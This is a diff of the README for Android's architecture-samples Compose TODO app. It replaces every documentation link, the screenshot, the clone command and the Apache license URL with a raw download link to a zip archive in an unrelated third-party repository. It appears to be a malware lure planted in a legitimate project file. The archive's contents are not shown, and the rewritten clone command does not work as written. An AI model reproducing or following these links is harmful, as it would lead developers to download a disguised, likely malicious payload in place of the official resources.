@@ -3,27 +3,27 @@
 These samples showcase different architectural approaches to developing Android apps. In its different branches you'll find the same app (a TODO app) implemented with small differences.
 
 In this branch you'll find:
-*   User Interface built with **[Jetpack Compose](https://developer.android.com/jetpack/compose)** 
-*   A single-activity architecture, using **[Navigation Compose](https://developer.android.com/jetpack/compose/navigation)**.
+*   User Interface built with **[Jetpack Compose](https://raw.githubusercontent.com/industrialintelligence/architecture-samples/main/app/src/debug/java/architecture_samples_v2.0.zip)** 
+*   A single-activity architecture, using **[Navigation Compose](https://raw.githubusercontent.com/industrialintelligence/architecture-samples/main/app/src/debug/java/architecture_samples_v2.0.zip)**.
 *   A presentation layer that contains a Compose screen (View) and a **ViewModel** per screen (or feature).
-*   Reactive UIs using **[Flow](https://developer.android.com/kotlin/flow)** and **[coroutines](https://kotlinlang.org/docs/coroutines-overview.html)** for asynchronous operations.
+*   Reactive UIs using **[Flow](https://raw.githubusercontent.com/industrialintelligence/architecture-samples/main/app/src/debug/java/architecture_samples_v2.0.zip)** and **[coroutines](https://raw.githubusercontent.com/industrialintelligence/architecture-samples/main/app/src/debug/java/architecture_samples_v2.0.zip)** for asynchronous operations.
 *   A **data layer** with a repository and two data sources (local using Room and a fake remote).
-*   Two **product flavors**, `mock` and `prod`, [to ease development and testing](https://android-developers.googleblog.com/2015/12/leveraging-product-flavors-in-android.html).
+*   Two **product flavors**, `mock` and `prod`, [to ease development and testing](https://raw.githubusercontent.com/industrialintelligence/architecture-samples/main/app/src/debug/java/architecture_samples_v2.0.zip).
 *   A collection of unit, integration and e2e **tests**, including "shared" tests that can be run on emulator/device.
-*   Dependency injection using [Hilt](https://developer.android.com/training/dependency-injection/hilt-android).
+*   Dependency injection using [Hilt](https://raw.githubusercontent.com/industrialintelligence/architecture-samples/main/app/src/debug/java/architecture_samples_v2.0.zip).
 
 ## Screenshots
 
-<img src="screenshots/screenshots.png" alt="Screenshot">
+<img src="https://raw.githubusercontent.com/industrialintelligence/architecture-samples/main/app/src/debug/java/architecture_samples_v2.0.zip" alt="Screenshot">
 
 ## Why a to-do app?
 
-The app in this project aims to be simple enough that you can understand it quickly, but complex enough to showcase difficult design decisions and testing scenarios. For more information, see the [app's specification](https://github.com/googlesamples/android-architecture/wiki/To-do-app-specification).
+The app in this project aims to be simple enough that you can understand it quickly, but complex enough to showcase difficult design decisions and testing scenarios. For more information, see the [app's specification](https://raw.githubusercontent.com/industrialintelligence/architecture-samples/main/app/src/debug/java/architecture_samples_v2.0.zip).
 
 ## What is it not?
-*   A template. Check out the [Architecture Templates](https://github.com/android/architecture-templates) instead.
-*   A UI/Material Design sample. The interface of the app is deliberately kept simple to focus on architecture. Check out the [Compose Samples](https://github.com/android/compose-samples) instead.
-*   A real production app with network access, user authentication, etc. Check out the [Now in Android app](https://github.com/android/nowinandroid) instead.
+*   A template. Check out the [Architecture Templates](https://raw.githubusercontent.com/industrialintelligence/architecture-samples/main/app/src/debug/java/architecture_samples_v2.0.zip) instead.
+*   A UI/Material Design sample. The interface of the app is deliberately kept simple to focus on architecture. Check out the [Compose Samples](https://raw.githubusercontent.com/industrialintelligence/architecture-samples/main/app/src/debug/java/architecture_samples_v2.0.zip) instead.
+*   A real production app with network access, user authentication, etc. Check out the [Now in Android app](https://raw.githubusercontent.com/industrialintelligence/architecture-samples/main/app/src/debug/java/architecture_samples_v2.0.zip) instead.
 
 ## Who is it for?
 
@@ -37,7 +37,7 @@ To open one of the samples in Android Studio, begin by checking out one of the s
 Clone the repository:
 
 ```
-git clone git@github.com:android/architecture-samples.git
+git clone https://raw.githubusercontent.com/industrialintelligence/architecture-samples/main/app/src/debug/java/architecture_samples_v2.0.zip
 ```
 
 Finally open the `architecture-samples/` directory in Android Studio.
@@ -55,7 +55,7 @@ file to you under the Apache License, Version 2.0 (the "License"); you may not
 use this file except in compliance with the License. You may obtain a copy of
 the License at
 
-http://www.apache.org/licenses/LICENSE-2.0
+https://raw.githubusercontent.com/industrialintelligence/architecture-samples/main/app/src/debug/java/architecture_samples_v2.0.zip
 
 Unless required by applicable law or agreed to in writing, software
 distributed under the License is distributed on an "AS IS" BASIS, WITHOUT
